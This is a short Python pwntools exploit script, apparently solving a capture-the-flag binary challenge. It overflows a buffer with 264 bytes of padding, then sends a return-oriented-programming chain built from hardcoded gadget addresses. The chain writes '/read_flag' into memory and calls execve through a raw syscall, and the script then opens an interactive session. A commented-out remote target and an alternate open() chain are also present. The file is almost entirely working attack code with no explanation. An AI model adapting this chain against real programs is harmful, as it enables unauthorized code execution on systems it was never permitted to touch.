from pwn import *
import time
sh = process("./app")
# sh = remote("34.82.101.212",10011)
context.arch = 'amd64'

main = 0x400b4d
binsh_addr = 0x6bc080
pop_rdi = 0x400686
pop_rsi = 0x410083
pop_rdx = 0x449455
pop_rax = 0x415234
mov_rdi_rsi = 0x446bbb
mov_rsi_rax = 0x47f011
syscall = 0x4011ec

# rop = flat(
           # pop_rdi,
           # binsh_addr + 0x08,
           # pop_rsi,
           # "ag\0\0\0\0\0\0",
           # mov_rdi_rsi,
            # pop_rdi,
           # binsh_addr,
           # pop_rsi,
           # "/read_fl",
           # mov_rdi_rsi,
           # pop_rdx,
           # 2,
           # pop_rsi,
           # 0,
           # pop_rax,
           # 0x2,
           # syscall,     # open
           # pop_rsi,
           # binsh_addr + 0x10,
           # mov_rsi_rax



        # )

rop = flat(
           pop_rdi,
           binsh_addr + 0x08,
           pop_rsi,
           "ag\0\0\0\0\0\0",
           mov_rdi_rsi,
            pop_rdi,
           binsh_addr,
           pop_rsi,
           "/read_fl",
           mov_rdi_rsi,
           pop_rdx,
           0,
           pop_rsi,
           0,
           pop_rax,
           0x3b,
           syscall # execve("/read_flag")
          )

pause()
sh.sendline(b'a'*264+rop)
sh.interactive()

